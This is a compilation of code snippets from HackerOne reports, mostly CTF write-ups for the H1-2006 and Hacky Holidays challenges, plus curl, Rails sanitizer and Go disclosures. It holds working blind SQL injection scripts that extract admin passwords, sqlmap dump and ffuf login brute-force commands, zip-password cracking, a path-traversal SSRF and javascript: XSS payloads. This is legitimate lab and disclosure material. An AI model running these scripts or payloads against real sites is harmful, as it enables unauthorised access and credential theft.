Searching in the Urlscan.io API... 🔍
Searching in the Threatcrowd API... 🔍
Searching in the Crtsh database API... 🔍
Searching in the Virustotal API... 🔍
Searching in the Sublist3r API... 🔍
Searching in the Spyse API... 🔍

staff.bountypay.h1ctf.com
software.bountypay.h1ctf.com
api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
www.bountypay.h1ctf.com
bountypay.h1ctf.com

A total of 6 subdomains were found for domain bountypay.h1ctf.com 👽 in 2 seconds.⏲️

Good luck Hax0r 💀!
```

## 263. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 16:14:12 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 09-Jul-2020 16:14:12 GMT; Max-Age=2592000
Location: /
Content-Length: 0
```

## 264. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 16:17:38 GMT
Content-Type: application/json
Connection: close
Content-Length: 177

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020","data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"}
```

## 265. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 16:27:29 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 491

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads\/&\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

## 266. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```bash
$ "WC1Ub2tlbg==" | base64 -d
X-Token: 
$ "aG9zdA==" | base64 -d
host
```

## 267. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```
HTTP/1.1 409 Conflict
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Jun 2020 13:15:29 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 39

["Staff Member already has an account"]
```

## 268. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Jun 2020 19:42:33 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

## 269. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
Putting everything together, I found a directory listing while fuzzing which leads me to the next step 

### Step 6 - Information Disclosure (Directory Listing, In-house APK)
```

## 270. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```bash
$ echo -n AAAAAAAAAA | md5sum
16c52c6e8326c071da771e66dc6e9e57  -
```

## 271. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```
2. Submit the following URL via the "Report This Page" functionality: `/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab3` 

The corresponding request contains that URL in URL-encoded base64 and looks as follows:
```

## 272. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```php
php > $y="hello grinch"; 
php > $x=str_replace("grinch", "", $y);
php > echo $x;
hello
```

## 273. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
php > echo md5("mrgrinch463127.0.0.1");
3e3f8df1658372edf0214e202acb460b
php >
```

## 274. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```python
#!/usr/bin/python3
import requests
import re

if __name__ == "__main__":
    print("[*] Challenge 6")
    url = "https://hackyholidays.h1ctf.com/my-diary/?template=index.php"
    r = requests.get(url)
    print("="*30)
    print("index.php source")
    print("="*30)
    print(r.text)
    print("="*30)
    payload = "secretadmsecretadadmin.phpmin.phpin.php"
    url = "https://hackyholidays.h1ctf.com/my-diary/? template={}".format(payload)
    r = requests.get(url)
    r1 = re.findall(r"flag\{[\w-]+\}",r.text)
    print("[*] Flag: {}".format(r1[0]))
```

## 275. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 03:47:29 GMT
Content-Type: application/json
Connection: close
Content-Length: 57

{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

## 276. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 03:51:22 GMT
Content-Type: application/json
Connection: close
Content-Length: 135

{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

## 277. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w common.txt -mc all -fc 404
...
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
...
```

## 278. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -w  names.txt -d "username=FUZZ&password=something" -fr "Invalid Username" -H "Content-Type: application/x-www-form-urlencoded"
...
access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
...
```

## 279. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -w  10-million-password-list-top-10000.txt -d "username=access&password=FUZZ" -fr "Invalid Password" -H "Content-Type: application/x-www-form-urlencoded"
...
computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
...
```

## 280. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ fcrackzip -u my_secure_files_not_for_you.zip -D -p 10-million-password-list-top-10000.txt

PASSWORD FOUND!!!!: pw == hahahaha
```

## 281. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ -w common.txt -mc 200
...
index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
...
```

## 282. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -w  common.txt
...
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
...
```

## 283. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/forum/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404
...
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
...
```

## 284. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ sqlmap -u 'https://hackyholidays.h1ctf.com/evil-quiz' --data 'name=cardinal' --second-url 'https://hackyholidays.h1ctf.com/evil-quiz/score' --random-agent --not-string 'There is 0 other player' --technique=B --level=3 --risk=3 --cookie 'session=206979a74800a0190f1f04c10db5ca8c'  -D quiz -T admin --dump
...
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | S3creT_p4ssw0rd-$ | admin    |
+----+-------------------+----------+
...
```

## 285. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ cat common.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
user:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==
ping:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3BpbmciLCJhdXRoIjoiOTMzZTJkMzk5NWE4MmIzZmQyODE1NWQyMjg3MDk1M2YifQ==
```

## 286. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ cat test.txt  | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
username:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9YW55dGhpbmciLCJhdXRoIjoiZTkwN2ZmZTJiZDFjYTc1YmI5ODliYjFkYTZiYTAwNDAifQ==
password:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/cGFzc3dvcmQ9YW55dGhpbmciLCJhdXRoIjoiNWI1MGQ3MTVjZjYyYmRmYjY4ZWQ1ZGQ1YzU3ZDBkMDgifQ==
```

## 287. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```python
# get_salt.py - finds salt of the hash by bruteforcing using rockyou.txt.
# Usage: python get_salt.py rockyou.txt
import sys, hashlib

file_path = sys.argv[1]
with open(file_path,'r', errors='replace') as f:
    words = f.readlines()

for word in words:
    result = word.strip()+'203.0.113.33'
    result = hashlib.md5(result.encode())

    if result.hexdigest() == "5f2940d65ca4140cc18d0878bc398955":
        print(word)
        break
```

## 288. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```python
import requests
from bs4 import BeautifulSoup

HOST = "https://hackyholidays.h1ctf.com"
hash_URL = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436%27%20UNION%20SELECT%20"1%27%20UNION%20SELECT%20%27rad.jpg%27,1,%27../api/user?username={}%%27%20--%20-",%2712%27,1--%20-"

strings = "0123456789abcdefghijklmnopqrstuvwxyz_"

for endpoint in strings:
    r = requests.get(hash_URL.format(endpoint.strip()))
    soup = BeautifulSoup(r.content, "html.parser")
    next_url = soup.findAll("img", {"class": "img-responsive"})
    if next_url:
        new_url = HOST + next_url[-1]["src"]
        nr = requests.get(new_url)
        if nr.content != "Expected HTTP status 200, Received: 204":
            print(endpoint, "--", new_url)
```

## 289. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 15 Dec 2020 05:18:04 GMT
Content-Type: application/json
Connection: close
Content-Length: 135
 
{
 "id":"eyJpZCI6MX0=",
 "name":"The Grinch",
"rating":"Amazing in every possible way!",
 "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```

## 290. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
It is telling that the file signupmanager.zip to be placed into the directory where it is being installed, so I visited [https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip][23] and got the file.
[23]: https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip     "https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip" 
There were 5 files in it `index.php, admin.php, user.php, signup.php` and `README.md`. The whole logic is is `index.php` page.
The index.php do the following things.
           1. For signup, it accepts 5 parameters username, password, age, firstname and lastname.
           2. For username, firstname and lastname it removes all special characters using regular expression and for firstname and lastname it gets first 15 characters  using substr function and it calculates md5 of password.
           3. It then checks if age is numeric or not and also if length is greater than 3.
           4. It passes all variables into addUser function.
           5. The addUser function takes all values and adds padding to all variables (15 for username, firstname and lastname and 3 for age), generates random md5, it then appends all values into one line and adds ‘N’ as end, it then calculates first 113 characters using substr function and writes it to users.txt file 
and returns random md5 as cookie.
           6. The function buildUsers reads file users.txt, converts it into object and returns the object.

From reading README.md, if ‘Y’ is at end of line, I can become admin. So, I have to somehow change the last character to ‘Y’.
Here is a small snippet that checks for a valid age.
# … truncated …
```

## 291. [#3650689](https://hackerone.com/reports/3650689)  -  CVE-2026-5773: wrong reuse of SMB connection
*low*

```
=== REPRODUCTION OF SMB CONNECTION REUSE VULNERABILITY ===
Version:
curl 8.19.0-DEV (x86_64-pc-linux-gnu) libcurl/8.19.0-DEV OpenSSL/3.0.13 zlib/1.3
===========================================================

--- TEST 1: Requesting file1 from share1, then file1 from share2 ---
Expected Output:
hello from share1
hello from share2

Actual Output:
hello from share1
hello from share1

--- TEST 2: Requesting file1 from share1, then file2 from share2 ---
Expected Output:
hello from share1
hello from share2

Actual Output:
hello from share1
```

## 292. [#3480925](https://hackerone.com/reports/3480925)  -  CVE-2025-15224: libssh key passphrase bypass without agent set
*low*

```
#include <curl/curl.h>
int main(void)
{
  CURL *curl = curl_easy_init();
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    curl_easy_setopt(curl, CURLOPT_URL, "sftp://host.example/");
    curl_easy_setopt(curl, CURLOPT_SSH_AUTH_TYPES, CURLSSH_AUTH_PUBLICKEY);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
  }
  return 0;
}
```

## 293. [#3788984](https://hackerone.com/reports/3788984)  -  CVE-2026-11564: Native CA trust persist
*low*

```c
/* Fresh handle: custom CA is present before TLS config is completed. */
CURL *fresh = curl_easy_init();
curl_easy_setopt(fresh, CURLOPT_CAINFO_BLOB, &private_ca);
curl_easy_perform(fresh); /* native_ca_store is not auto-enabled */

/* Reused handle: an earlier default-trust transfer set native_ca_store. */
CURL *reused = curl_easy_init();
curl_easy_setopt(reused, CURLOPT_URL, "https://public.example/");
curl_easy_perform(reused); /* native_ca_store becomes TRUE */

curl_easy_setopt(reused, CURLOPT_URL, "https://api.example/");
curl_easy_setopt(reused, CURLOPT_CAINFO_BLOB, &private_ca);
curl_easy_perform(reused); /* native_ca_store can remain TRUE */
```

## 294. [#3018307](https://hackerone.com/reports/3018307)  -  Groups module can halt chain when handling a proposal with malicious group weights
*high, $15,000*

```golang
// setExponent sets d's Exponent to the sum of xs. Each value and the sum
// of xs must fit within an int32. An error occurs if the sum is outside of
// the MaxExponent or MinExponent range. res is any Condition previously set
// for this operation, which can cause Underflow to be set if, for example,
// Inexact is already set.
func (d *Decimal) setExponent(c *Context, res Condition, xs ...int64) Condition {
    var sum int64
    for _, x := range xs {
        if x > MaxExponent {
            return SystemOverflow | Overflow
        }
        if x < MinExponent {
            return SystemUnderflow | Underflow
        }
        sum += x
    }
    r := int32(sum)
```

## 295. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```python
import requests
 import string

# All the printable characters
chars = string.printable
# Maintaining Session State
session = requests.Session()
final = ""
ct = 0
print("[*] Finding Password ... ")
password = 1
 while ct < 100 :
    ct = 1
    for char in chars:
        sqli="1' or (ascii(substr((select password from admin ) ,{},1))) ={} -- -".format(str(password),ord(char))
        post_parameters = {"name":str(sqli)}
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/84.0.522.63","Content-Type":"application/x-www-form-urlencoded"}
        cookies = {"session":"206979a74800a0190f1f04c10db5ca8c"}
        post_response = session.post("https://hackyholidays.h1ctf.com/evil-quiz", data=post_parameters, headers=headers, cookies=cookies)
        get_response = session.get("https://hackyholidays.h1ctf.com/evil-quiz/score", headers=headers, cookies=cookies)
        # print(char)
        if  'There is 0 other player(s)' not in get_response.text:
            final += str(char)
            print(final)
            break
        ct += 1
    password += 1
print('[+]Found: '.format(str(final)))
```

## 296. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```python
import re
import requests

URL = "https://hackyholidays.h1ctf.com/evil-quiz"
strings = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$&\'()*+,-./:;@_"
username = ""

while True:
    print("password: ", username)
    for i in strings:
        cookies = {
            "session": "1c0c8fea0d49a4e09317092fa1dbef21",
            "expires": "Tue, 22-Dec-2020 11:03:29 GMT",
            "Max-Age": "86400",
            "path": "/evil-quiz",
        }
        payload = {
                "name": "grinch' or 1=( SELECT 1 FROM admin WHERE password LIKE BINARY '{}%') -- -".format(
                (username+i)
            )
        }
        print("Trying: ", payload["name"])
        r = requests.post(URL, cookies=cookies, data=payload)

        start_url = URL + "/start"
        data = {"ques_1": "0", "ques_2": "0", "ques_3": "0"}
        r = requests.post(start_url, cookies=cookies, data=data)

        search = re.search(
            b'<div style="margin-top:20px">There(.*)</div>', r.content, re.IGNORECASE
        )
        number = len(search.group(1).split()[1])

        if number > 5:
            username = username + i
            break
        else:
            continue
```

## 297. [#1069388](https://hackerone.com/reports/1069388)  -  It's just a man on a mission
*critical*

```python
import requests
import re
from string import printable

base_username=''
base_password='s3cret\_p4ssw0rd-'

headers= { "Content-Type" : "application/x-www-form-urlencoded" }
cookies= { "session" : "fa3c1dba251b1de924de64d2322c446f" }

def search_username(username):    
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        post_data = { "name" : "admin' and EXISTS (SELECT * FROM admin WHERE username LIKE '{}{}%') -- -".format(username,c) } 
        r=requests.post('https://hackyholidays.h1ctf.com/evil-quiz', data = post_data, headers=headers, cookies=cookies)
        r2=requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', cookies=cookies)
        if r2.text.find("is 0 other player(s)") == -1:
            username += c
            print("new char found: " +username)
            search_username(username)

def search_password(password):
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        post_data = { "name" : "admin' and EXISTS (SELECT * FROM admin WHERE username LIKE 'admin' and password LIKE '{}{}%') -- -".format(password,c) } 
        r=requests.post('https://hackyholidays.h1ctf.com/evil-quiz', data = post_data, headers=headers, cookies=cookies)
        r2=requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', cookies=cookies)
        if r2.text.find("is 0 other player(s)") == -1:
            password += c
            print("new char found: " +password)
            search_password(password)
        
        
# … truncated …
```

## 298. [#389108](https://hackerone.com/reports/389108)  -  Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin
*critical*

```
> I'm not sure, but looks like calling this method with crafted payload may lead to incorrect userId in telemetry. 

Team probably should know how much powerful listed above funcstions are. 

#### `_fetch`

`p.tracker.gnar` has `_fetch` property which points to `fetch` function.
More interesting is that, it's a polyfill, not a native function.

> I guess this polyfill isn't compliable to WHATWG fetch, because it allows making requests to `data:/chrome-extension:/` origins.

That means, it's possible to call `fetch()` with attacker's params from the extension.
```

## 299. [#867249](https://hackerone.com/reports/867249)  -  The hacker has access to the administrative part of the management reports in publish report
*low, $500*

```http
POST:

'''
```

## 300. [#3601655](https://hackerone.com/reports/3601655)  -  Rails::HTML::Sanitizer.allowed_uri? returns true for entity-encoded control-character-split javascript: URLs
*low*

```http
puts Rails::HTML::Sanitizer.allowed_uri?("java&#13;script:alert(1)")
```

## 301. [#3601655](https://hackerone.com/reports/3601655)  -  Rails::HTML::Sanitizer.allowed_uri? returns true for entity-encoded control-character-split javascript: URLs
*low*

```http
puts Rails::HTML::Sanitizer.allowed_uri?("java&#10;script:alert(1)")
```

## 302. [#3601655](https://hackerone.com/reports/3601655)  -  Rails::HTML::Sanitizer.allowed_uri? returns true for entity-encoded control-character-split javascript: URLs
*low*

```http
puts Rails::HTML::Sanitizer.allowed_uri?("jav&#9;ascript:alert(1)")
```

## 303. [#3601655](https://hackerone.com/reports/3601655)  -  Rails::HTML::Sanitizer.allowed_uri? returns true for entity-encoded control-character-split javascript: URLs
*low*

```http
puts san.sanitize('<a href="java&#13;script:alert(1)">x</a>')
```

## 304. [#3650689](https://hackerone.com/reports/3650689)  -  CVE-2026-5773: wrong reuse of SMB connection
*low*

```bash
# 1. Setup Samba server locally for the PoC
sudo apt-get update && sudo apt-get install -y samba smbclient
sudo bash -c "cat << 'EOF' >> /etc/samba/smb.conf

[global]
    map to guest = bad user
    server min protocol = NT1

[share1]
    path = /tmp/share1
    read only = no
    guest ok = yes
    guest only = yes

[share2]
    path = /tmp/share2
    read only = no
    guest ok = yes
    guest only = yes
EOF"

# 2. Create the shares and dummy files
mkdir -p /tmp/share1 /tmp/share2
echo "hello from share1" > /tmp/share1/file1
echo "hello from share2" > /tmp/share2/file1
echo "hello from share2" > /tmp/share2/file2
chmod -R 777 /tmp/share1 /tmp/share2
sudo systemctl restart smbd

# 3. Create a test script (poc.sh)
cat << 'EOF' > poc.sh
#!/bin/bash
echo -e "\n=== REPRODUCTION OF SMB CONNECTION REUSE VULNERABILITY ==="
echo "Version:"
./src/curl -V | head -n1
echo "==========================================================="

echo -e "\n--- TEST 1: Requesting file1 from share1, then file1 from share2 ---"
echo "Expected Output:"
echo "hello from share1"
# … truncated …
```

## 305. [#3788984](https://hackerone.com/reports/3788984)  -  CVE-2026-11564: Native CA trust persist
*low*

```c
#if defined(USE_APPLE_SECTRUST) || defined(CURL_CA_NATIVE)
  fail_unless(((struct Curl_easy *)curl)->set.ssl.native_ca_store,
              "default TLS config should enable native CA store");
  curl_easy_setopt(curl, CURLOPT_CAINFO, "custom-ca.pem");
  if(Curl_ssl_easy_config_complete((struct Curl_easy *)curl, origin))
    goto unit_test_abort;
  fail_unless(((struct Curl_easy *)curl)->set.ssl.custom_cafile,
              "custom CAfile flag should be set");
  fail_unless(((struct Curl_easy *)curl)->set.ssl.native_ca_store,
              "custom CAfile after default config keeps native CA store");
#endif
```
